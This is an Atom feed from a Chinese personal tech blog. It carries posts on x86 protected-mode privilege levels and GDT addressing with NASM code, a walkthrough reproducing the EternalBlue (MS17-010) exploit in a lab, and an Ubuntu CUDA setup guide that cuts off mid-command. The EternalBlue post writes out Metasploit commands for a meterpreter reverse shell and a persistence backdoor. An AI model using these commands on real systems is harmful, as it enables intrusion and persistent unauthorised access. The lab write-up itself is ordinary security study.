<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>清欢&#39;s Blog</title>
  
  <subtitle>一个杂乱的笔记本</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mingliangliu.com/"/>
  <updated>2019-08-10T10:12:40.727Z</updated>
  <id>https://mingliangliu.com/</id>
  
  <author>
    <name>清欢</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>保护模式特权级级概述</title>
    <link href="https://mingliangliu.com/2019/08/10/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E7%BA%A7%E6%A6%82%E8%BF%B0/"/>
    <id>https://mingliangliu.com/2019/08/10/保护模式特权级级概述/</id>
    <published>2019-08-10T07:04:53.000Z</published>
    <updated>2019-08-10T10:12:40.727Z</updated>
    
    <content type="html"><![CDATA[<p>在IA32的操作系统中，段被分为了4个特权级，分别为0-3级，有时候我们也叫做ring0-ring3，其中，数值越小特权级越高。如下图所示：</p><p><img src="/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B01.jpg" alt></p><p>图中，核心代码和数据所在的段的特权级都比较高，一般在ring0，而用户程序所在的段的特权级较低，一般在ring3。当低特权级的任务试图在未被允许的情况下访问高特权级的段时，将会产生常规保护错误。</p><p>而处理器是如何区分所在段的特权级，进而对其进行保护的呢？这就不得不提到CPL、DPL和RPL三者了。但是在开始之前，我们需要先了解一下一致代码段和非一致代码段。</p><h2 id="一致代码段和非一致代码段"><a href="#一致代码段和非一致代码段" class="headerlink" title="一致代码段和非一致代码段"></a>一致代码段和非一致代码段</h2><p>在操作系统中，我们有些高特权级的代码是希望被低特权级的程序所访问的，比如一些库函数，于是我们将这些高特权级代码放在一个叫做一致代码段的段里。而有些高特权级的代码，我们并不想让低特权级的程序所访问，于是我们把他们放在一个叫做非一致代码段的段里。具体来说，当通过call或者jmp指令转移到其它段时（即访问其他段），当转移的目标是一个优先级更高的一致代码段时，我们是可以进行访问的，但是当前的特权级会被延续下去；当转移的目标是一个优先级更高的非一致代码段时，这时的访问会引起常规保护错误（除非使用调用门或任务门）。</p><p>总结来说：</p><ul><li><p>一致代码段：由系统（高特权级）共享给低特权级的程序的代码所在的段，主要有下面两点限制：</p><ol><li>高特权级程序不能访问低特权级的数据</li><li>低特权级的程序可以访问高特权级的代码，但是<strong>特权级不会改变</strong>，还是保持低特权级程序的特权级</li></ol></li><li><p>非一致代码段：为了避免被低特权级程序所访问而保护起来的代码段，主要有一点限制：</p><ol><li>只允许同级之间访问</li></ol></li><li><p>另外，数据段都是非一致的 </p></li></ul><p>所遵循的规则如下图所示：</p><p><img src="/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%89%B9%E6%9D%83%E7%BA%A7%E6%A6%82%E8%BF%B02.jpg" alt></p><h2 id="CPL"><a href="#CPL" class="headerlink" title="CPL"></a>CPL</h2><p>CPL全称Current Privilege Level，顾名思义，CPL代表的是当前执行的任务和程序的特权级。它存储在cs和ss的第0位和第1位上。<strong>一般情况下</strong>，CPL等于代码所在段的特权级，当程序转移到不同的代码段时，处理器将改变CPL的值。</p><p>但是当访问一致代码段时，并不会改变CPL，正如一致代码段中所说，一致代码段可以被低特权级的程序所访问，但是并不会改变特权级，所以也就不会改变CPL，这就是与上面加粗的“一般情况”相对的“非一般情况”。</p><h2 id="DPL"><a href="#DPL" class="headerlink" title="DPL"></a>DPL</h2><p>DPL全程为Descriptor Privilege Level，它代表段或者门的特权级。他被存储在段描述符或者门描述符属性中的DPL字段上。</p><p>当当前的代码段试图访问一个段或者门时，DPL将会和CPL以及段或者门选择子的RPL相比较，而对于段或者门类型的不同，比较规则也不同，具体如下：</p><ul><li>数据段：如果访问的是一个数据段，DPL代表访问此段的最低特权级，即只有CPL &lt;= DPL（数值上），才有权限访问。</li><li>非一致代码段（不使用调用门）：DPL代表访问此段的特权级。即只有DPL = RPL，才有权限访问。</li><li>调用门：DPL规定了当前执行的任务和程序可以访问此调用门的最低特权级，即要CPL &lt;= DPL</li><li>一致代码段和非一致代码段（使用调用门访问）：DPL规定了访问此段的最高特权级。即只有CPL &gt;= DPL，才有权限访问。</li><li>TSS：DPL规定了访问此TSS的最低特权级。</li></ul><p>总结一下就是：</p><ul><li>在 数据段、调用门、TSS中，DPL代表最低特权级，访问要求：CPL &lt;= DPL</li><li>在 不使用调用门访问的非一直代码段时，访问要求： CPL = DPL</li><li>在 一致代码段和使用调用门访问的非一致代码段中，DPL 代表最高特权级，访问要求：CPL &gt;= DPL</li></ul><h2 id="RPL"><a href="#RPL" class="headerlink" title="RPL"></a>RPL</h2><p>RPL全称是Requested Privilege Level。RPL保存在段选择子的第0位和第1位上。我们在上文说了当一个段访问另一个段时，CPL与DPL的比较规则，但是仅仅比较CPL和DPL是不够的，处理器还要通过检查RPL来确定能否访问另一个段。</p><p>操作系统往往用RPL来避免低特权级应用程序访问高特权级段内的数据，即便提出访问请求的段有足够的特权级，如果RPL不够也是不行的，当RPL的值比CPL大的时候，RPL将起决定性作用。也就是说，只有当CPL和RPL都小于要访问的数据段的DPL时，才有权限访问该数据段。关于为什么引入RPL的讨论还是比较复杂的，此处不再深入探讨。</p><hr><p>完</p><p>参考：</p><ul><li>《一个操作系统的实现》 于渊</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在IA32的操作系统中，段被分为了4个特权级，分别为0-3级，有时候我们也叫做ring0-ring3，其中，数值越小特权级越高。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E7%8
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="保护模式" scheme="https://mingliangliu.com/tags/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>保护模式下的寻址</title>
    <link href="https://mingliangliu.com/2019/08/04/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%AF%BB%E5%9D%80/"/>
    <id>https://mingliangliu.com/2019/08/04/保护模式下的寻址/</id>
    <published>2019-08-04T12:20:03.000Z</published>
    <updated>2019-08-10T07:03:22.874Z</updated>
    
    <content type="html"><![CDATA[<p>在汇编语言中，或者你有学习过诸如微机原理或计算机组成原理等课程的话，那么你很可能听说过实模式和保护模式的概念。他们到底是什么，有什么不同，又如何寻址？</p><p>在王爽的《汇编语言》最后，有关于Intel微处理器的三种工作模式的介绍。</p><p>继Intel 8086推出之后，Intel又推出了划时代的80386微处理器，它可以在实模式、保护模式和虚拟8086模式下工作，从那以后的微处理器都提供了这三种工作模式，直到现在。Intel系列微处理器的三种工作模式如下：</p><ul><li>实模式：工作模式相当于一个8086</li><li>保护模式：提供支持多任务环境的工作方式，建立保护机制</li><li>虚拟8086模式：可以从保护模式切换至其中的一种8086工作方式，这种方式的提供使用户可以方便的在保护模式下运行一个或多个8086程序</li></ul><p>当我们的系统开机时，cpu首先工作在实模式下完成一些工作，之后跳入保护模式，为我们的系统提供多任务环境的支持。而当我们需要在保护模式的系统上运行实模式下的程序时（比如学习汇编时所用的DOS系统），我们就需要在当前的保护模式下弄一个“假”的实模式，这就是虚拟8086模式。</p><h2 id="GDT和描述符"><a href="#GDT和描述符" class="headerlink" title="GDT和描述符"></a>GDT和描述符</h2><p>在实模式下（可以理解为工作在8086上时），我们的CPU是16位的，提供了16位的寄存器，16位数据总线，20位的地址总线，可寻址范围位1M。物理地址遵循下面的计算公式：</p><p>$$<br>物理地址 = 段地址 * 16 + 偏移地址<br>$$</p><p>其中的段地址和偏移地址都是16位的。</p><p>从80386开始，Intel家族的CPU进入了32位时代，这时候CPU有32位的地址总线，所以可寻址范围为4G。CPU同样拥有的是32位的寄存器，一个寄存器即可寻址4GB的空间。</p><p>在实模式下，我们采用<strong>段地址:偏移地址</strong>的寻址方式是因为我们只有16为的寄存器，单个寄存器的寻址范围达不到1MB，但现在我们拥有了32位的寄存器，单个寄存器的可寻址范围已经可以达到4GB了，那么是不是就不需要段寄存器了？答案是否定的。在保护模式下，地址仍然采用“段地址:偏移地址”的方式来表示，只是<strong>段的概念发生了根本性的变化</strong>。</p><p>实模式下，段值（段地址的值）还是地址的一部分。在保护模式下，虽然段值仍然由原来的<strong>16位</strong>的cs、ds等寄存器表示，但是此时它们仅仅是一个索引，这些个索引<strong>指向一个数据结构的表项</strong>，表项中详细定义了一个段的起始地址、界限、属性等内容，这个数据结构，叫做<strong>GDT</strong>（其实还可能是LDT，我们先讨论大多数情况），GDT中的每一个表项，叫做<strong>描述符</strong></p><h2 id="寻址过程"><a href="#寻址过程" class="headerlink" title="寻址过程"></a>寻址过程</h2><p>我们在来看一下保护模式下的寻址过程。在此之前，有几点要说明：</p><ul><li>GDT是一个数据结构，它是保存在内存中的，所以它应该有一个起始地址，它是一系列描述符的集合</li><li>GDT的起始地址由一个专门的寄存器来存放 – gdtr，gdtr寄存器是48位的，这个寄存器我们稍后在探讨</li><li>GDT中的每一个描述符描述一个段，其中包括段的起始地址（基址）等属性</li><li>保护模式的偏移地址和实模式下的是相同的，只不过是32位</li></ul><p>好了，下面有一张图，我们可以看着这张图过一遍保护模式下是如何寻址的。</p><img src="/images/保护模式的寻址1.jpg"><ol><li>寻址时，先找到gdtr寄存器，从中得到GDT的基址</li><li>有了GDT的基址，又有段寄存器中保存的索引，可以得到段寄存器“所指”的那个表项，既所指的那个描述符</li><li>得到了描述符，就可以从描述符中得到该描述符所描述的那个段的起始地址</li><li>有了段的起始地址，将偏移地址拿过来与之相加，便能得到最后的<strong>线性地址</strong></li><li>有了线性地址（虚拟地址），经过变换，即可得到相应的物理地址</li></ol><p>相信到这里，你已经对寻址过程有了个大概的了解，然后我们看看我们上面所未详细提及的东西</p><h2 id="gdtr寄存器"><a href="#gdtr寄存器" class="headerlink" title="gdtr寄存器"></a>gdtr寄存器</h2><p>gdtr是一个48位的寄存器，其中保存了GDT的基地址和界限（或者说GDT的长度），高32位为GDT的基地址，低16位为界限。还记得保护模式中的段寄存器也是16位的吗，它们和gdtr中的界限是对应的啊。</p><img src="/images/保护模式下的寻址4.jpg" title="title gdtr寄存器"><h2 id="描述符"><a href="#描述符" class="headerlink" title="描述符"></a>描述符</h2><p>GDT中的每个描述符占8个字节，其结构如下</p><img src="/images/保护模式下的寻址2.jpg"><p>我们可以不用管其中的属性，仅看段基址和段界限。是不是和上面的寻址联系上了呢。</p><p>你可能会问，问什么段基址和段界限都被分开了，却不放在一起？这主要还是历史遗留问题，我们就不在探讨了。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>光看理论终究还是水中月，我们看一段简单的代码实际体会一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[SECTION .gdt]</span><br><span class="line">; GDT</span><br><span class="line">;                              段基址,       段界限     , 属性</span><br><span class="line">LABEL_GDT:   Descriptor       0,                0, 0           ; 空描述符</span><br><span class="line">LABEL_DESC_CODE32: Descriptor       0, SegCode32Len - 1, DA_C + DA_32; 非一致代码段</span><br><span class="line">LABEL_DESC_VIDEO:  Descriptor 0B8000h,           0ffffh, DA_DRW     ; 显存首地址</span><br><span class="line">; GDT 结束</span><br><span class="line"></span><br><span class="line">GdtLenequ$ - LABEL_GDT; GDT长度</span><br><span class="line">GdtPtrdwGdtLen - 1; GDT界限</span><br><span class="line">dd0; GDT基地址</span><br><span class="line"></span><br><span class="line">; GDT 选择子</span><br><span class="line">SelectorCode32equLABEL_DESC_CODE32- LABEL_GDT</span><br><span class="line">SelectorVideoequLABEL_DESC_VIDEO- LABEL_GDT</span><br></pre></td></tr></table></figure><p>上面的代码中，我们定义了一个角.gdt的段，其中前三个LABLE_xxx后是我们用一个叫Descriptor宏定义了三个选择子，其中的数值并不一定正确，因为我们只是定义了，还<strong>并没有初始化</strong>。 Descriptor的作用是将段基址、段界限和属性放在一个选择子中相应的位置，其定义在文章末尾，感兴趣的话可以看下。</p><p><code>GdtPtr</code>是不是和gdtr中所放的内容一样呢？没错，当我们在实模式进入保护模式之前，我们需要将GdtPtr的值加载到gdtr寄存器：使用指令<code>lgdt [GdtPtr]</code></p><p>那最后两个GDT选择子又是什么呢？好像是描述符相对于GDT基地址的偏移，其实并不全对，它稍稍复杂一些，如下图所示。</p><img src="/images/保护模式下的寻址3.jpg"><p>其中TI和RPL是选择子的一些属性，剩下的高13位表示的是描述符在描述符表的位置，即GDT中<strong>第几个</strong>描述符</p><p>最后，我们看一下如何使用上面的东西吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[SECTION .s32]; 32 位代码段. </span><br><span class="line">[BITS32]</span><br><span class="line"></span><br><span class="line">LABEL_SEG_CODE32:</span><br><span class="line">movax, SelectorVideo</span><br><span class="line">movgs, ax; 视频段选择子(目的)</span><br><span class="line"></span><br><span class="line">movedi, (80 * 11 + 79) * 2; 屏幕第 11 行, 第 79 列。</span><br><span class="line">movah, 0Ch; 0000: 黑底    1100: 红字</span><br><span class="line">moval, &apos;P&apos;</span><br><span class="line">mov[gs:edi], ax</span><br><span class="line"></span><br><span class="line">; 到此停止</span><br><span class="line">jmp$</span><br><span class="line"></span><br><span class="line">SegCode32Lenequ$ - LABEL_SEG_CODE32</span><br></pre></td></tr></table></figure><p>上述代码将一个字母P显示在屏幕上。gs中保存的是显存的选择子，edi为偏移地址，然后使用<code>mov    [gs:edi], ax</code>将ax的内容写入到地址为<strong>gs所指的描述符中的段基址+edi</strong>的内存处，由于这里写入的是显存，所以将会将一个字母P显示在屏幕上。</p><p>Descriptor宏的定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; usage: Descriptor Base, Limit, Attr</span><br><span class="line">;        Base:  dd</span><br><span class="line">;        Limit: dd (low 20 bits available)</span><br><span class="line">;        Attr:  dw (lower 4 bits of higher byte are always 0)</span><br><span class="line">%macro Descriptor 3</span><br><span class="line">dw%2 &amp; 0FFFFh; 段界限1</span><br><span class="line">dw%1 &amp; 0FFFFh; 段基址1</span><br><span class="line">db(%1 &gt;&gt; 16) &amp; 0FFh; 段基址2</span><br><span class="line">dw((%2 &gt;&gt; 8) &amp; 0F00h) | (%3 &amp; 0F0FFh); 属性1 + 段界限2 + 属性2</span><br><span class="line">db(%1 &gt;&gt; 24) &amp; 0FFh; 段基址3</span><br><span class="line">%endmacro ; 共 8 字节</span><br></pre></td></tr></table></figure><hr><p>完</p><p>参考：</p><ul><li>《汇编语言》 王爽</li><li>《一个操作系统的实现》 于渊</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在汇编语言中，或者你有学习过诸如微机原理或计算机组成原理等课程的话，那么你很可能听说过实模式和保护模式的概念。他们到底是什么，有什么不同，又如何寻址？&lt;/p&gt;
&lt;p&gt;在王爽的《汇编语言》最后，有关于Intel微处理器的三种工作模式的介绍。&lt;/p&gt;
&lt;p&gt;继Intel 808
      
    
    </summary>
    
      <category term="汇编" scheme="https://mingliangliu.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
      <category term="汇编" scheme="https://mingliangliu.com/tags/%E6%B1%87%E7%BC%96/"/>
    
      <category term="保护模式" scheme="https://mingliangliu.com/tags/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <link href="https://mingliangliu.com/2019/08/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://mingliangliu.com/2019/08/04/永恒之蓝漏洞复现/</id>
    <published>2019-08-04T09:07:47.000Z</published>
    <updated>2019-08-04T16:31:45.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的补丁，然而并没有引起多大的重视，直到17年5月12日WannaCry勒索病毒爆发时，很多用户因未安装补丁而受害。</p><h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><ul><li>Kali Linux (IP: 192.168.190.135)</li><li>Metasploit工具</li><li>靶机，MSDN下载的win7  (IP: 192.168.190.136)</li></ul><p>win7中开启文件共享</p><h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>先启动msfconsole，输入如下指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.190.136:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.190.136:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>从上述结果可知：该win7存在漏洞</p><h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>执行如下指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="built_in">set</span> RHOSTS 192.168.190.136</span><br><span class="line">RHOSTS =&gt; 192.168.190.136</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p>第一行指令意思是加载Metasploit中的EternalBlue攻击模块，第四行是设置shell的通信类型，payload中装载的是漏洞利用成功后在目标机器上执行的代码</p><p>结果如下：</p><img src="/images/永恒之蓝漏洞复现1.PNG"><p>执行一下<code>shell</code>指令：</p><img src="/images/永恒之蓝漏洞复现2.PNG"><p>可以看到，我们已获得目标机器的最高权限的shell</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>metasploit自带的留后门方式有两种：metsvc和persistence，但都有弊端，官方都不推荐使用，这里使用persistence试下</p><p>执行如下指令即可在目标机器中留一个后门：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -U -i 10 -p 4444 -r 192.168.190.135</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>-U：设置后门在用户登录后自启动。</li><li>-i：设置反向连接间隔时间，单位为秒。</li><li>-p：设置反向连接的端口号。</li><li>-r：设置反向连接的ip地址。</li></ul><p>之后可以使用handler模块进行连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.190.135</span><br><span class="line">LHOST =&gt; 192.168.190.135</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><hr><p>完</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;永恒之蓝是美国国家安全局开发的漏洞利用程序，该工具利用445/TCP端口的文件分享协议的漏洞进行传播。尽管微软与17年3月份就发布了该漏洞的
      
    
    </summary>
    
      <category term="信息安全" scheme="https://mingliangliu.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="信息安全" scheme="https://mingliangliu.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>机器学习环境搭建</title>
    <link href="https://mingliangliu.com/2019/04/24/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://mingliangliu.com/2019/04/24/机器学习环境搭建/</id>
    <published>2019-04-24T15:12:07.000Z</published>
    <updated>2019-08-04T16:31:45.377Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇写于2019-4-25</p><p>这两天装Ubuntu18.04双系统简直装到崩溃。一是非常著名的开机卡死在Logo界面的问题，另一个是在装Nvidia驱动和CUDA的时候，更是费心。而网上的资料又良莠不齐，走了不少弯路。于是做个总结，方便以后的自己，也方便别人。</p><p>首先：我的机器是戴尔灵越5577，以下方案不一定适合您的机器，操作失败还请自行百度解决，并且安装所CUDA和cuDNN版本请务必参照<a href="https://tensorflow.google.cn/install/source" target="_blank" rel="noopener">官网配置</a></p><p>另外：安装过程中并没有保留截图，以下也只有文字叙述，有时间会补上。</p><h2 id="装机"><a href="#装机" class="headerlink" title="装机"></a>装机</h2><p>镜像是在Ububtu官网下载的镜像，这没有什么异议。启动盘制作方面我选择<a href="https://rufus.ie/" target="_blank" rel="noopener">rufus</a>，小巧免费好用，而且非常适合制作Linux启动盘。</p><p>选好U盘选好镜像后就可以制作了，我是选的默认设置，如下图。我也试过gpt格式的，均可。</p><img src="/images/rufus_en.png"><p>制作完成后，关闭rufus就可以了，带着U盘，重新启动。</p><p>进入U盘引导（不同品牌的电脑有不同的方式，Dell是按F12选择启动方式），进入grub界面。</p><p>你可能看过许多教程说的是，为防止开机开在Logo，选中Install Ubuntu，然后按e编辑。我的建议是先别这样做，因为编辑后进入的安装界面屏幕分辨率会很低，许多按钮在屏幕下方根本点不到，安装很不方便。这里我直接回车开始安装，至于会卡在logo这个问题，装好后再弄。</p><p>然后一步步安装就可以了。装的时候一定要注意：<strong>不要联网</strong>、<strong>不要选安装驱动啥的，最小化安装即可</strong>、<strong>手动分区</strong>。我的分区方式如下，共分给Linux 100G</p><table><thead><tr><th align="center">目录</th><th align="center">大小</th><th align="center"></th></tr></thead><tbody><tr><td align="center">/</td><td align="center">20G</td><td align="center">逻辑分区</td></tr><tr><td align="center">/boot</td><td align="center">1G</td><td align="center">逻辑分区</td></tr><tr><td align="center">/home</td><td align="center">69G</td><td align="center">逻辑分区</td></tr></tbody></table><p>装完后，会显示重新启动，如果点立即重启的话，不出意外，会卡在这里，没关系，按住电源键不放，强制关机。再开机后就可看到系统选择界面了。</p><p>这个时候不要着急选择，先选中Ubuntu，按e键进入编辑，将倒数第二段最后（可能是倒数第三行，不难分辨）的<code>quiet splash</code> 后加上<code>nomodeset</code>，注意<code>nomodeset</code>要和前后有一个空格。然后按F10，即可开机。</p><p>这时候，应该可以进入系统了，这个时候开始安装显卡驱动。</p><h2 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h2><p>这里有很多教程说是通过<code>sudo ubuntu-drivers autoinstall</code>这个方法安装的，但是就我亲身经历而言，并不好使，这里安装驱动是没问题的，但是后来在安装CUDA的时候会遇到各种各样的问题。</p><p>这里的建议是，去Nvidia的官网选择一个适合你的显卡的驱动（我选的最新的），下载好备用。</p><p>在装驱动之前，先将nouveau加入黑名单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/blacklist.conf</span><br></pre></td></tr></table></figure><p>在末尾加上一行<code>blacklist nouveau</code></p><p>保存退出，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-initramfs -u</span><br></pre></td></tr></table></figure><p>另外：由于折腾的次数比较多我还改了<code>/etc/default/grub</code>，不知道和这有没有关系：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/default/grub</span><br></pre></td></tr></table></figure><p>然后将<code>quiet splash</code>后面加上<code>acpi_osi=linux</code></p><p>保存退出，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-grub</span><br></pre></td></tr></table></figure><p>接下来按CTRL+ALT+F2，进入纯字符界面，以root身份登入，开始安装显卡驱动。首先进入刚才下好的驱动所在的目录，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./NVIDIA-Linux-x86_64-xxx.xx.run –no-opengl-files  <span class="comment"># 一定不要忘记后面的参数</span></span><br></pre></td></tr></table></figure><p>然后一路确定，完成后重启系统，进入BIOS（戴尔是按F2，其他电脑型号请自行查找资料），<strong>关掉secure boot，设置为disable</strong>，关掉后保存重启。这里<strong>一定要关掉</strong>，不然开机后是没法用刚才装的Nvidia驱动的。</p><p>启动后在控制台输入<code>nvidia-smi</code>，若没有报错则证明安装成功。</p><h2 id="安装CUDA"><a href="#安装CUDA" class="headerlink" title="安装CUDA"></a>安装CUDA</h2><p>接下来，我们安装CUDA，我这里使用的是CUDA10.0，因为目前tensorflow已经可以使用CUDA10了，也就不挑旧版本安装了。</p><p>到Nvidai官网上找到CUDA10.0的下载链接，Nvidia给出的默认的CUDA的下载链接是CUDA10.1，因为我没试验过，所以不知道可不可以用，你可以自行决定。</p><p>依次选择 Linux -&gt; x86_64 -&gt; Ubuntu -&gt; 18.04 -&gt; runfile(local)，选好后选择Base Install开始下载。</p><p>下好后，找到CUDA安装包所在的位置，在控制台输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./cuda_10.0.130_410.48_linux.run</span><br></pre></td></tr></table></figure><p>然后等待一会后，会出来安装协议，按住空格键快速看完。然后选择安装选项：</p><ul><li>第一项，选择accept接受。</li><li>第二项，询问你是否安装CUDA中带的显卡驱动，由于我们前面已经安装了驱动，所以不安装，选n</li><li>剩下的，能选y的选y，能Enter的Enter就好。</li></ul><p>装好后，在~/.bashrc最后 添加环境变量，保存后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=<span class="variable">$LD_LIBRARY_PATH</span>:/usr/<span class="built_in">local</span>/cuda-10.0/lib64</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/cuda-10.0/bin</span><br><span class="line"><span class="built_in">export</span> CUDA_HOME=<span class="variable">$CUDA_HOME</span>:/usr/<span class="built_in">local</span>/cuda-10.0</span><br></pre></td></tr></table></figure><p>测试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/cuda/samples/1_Utilities/deviceQuery </span><br><span class="line">sudo 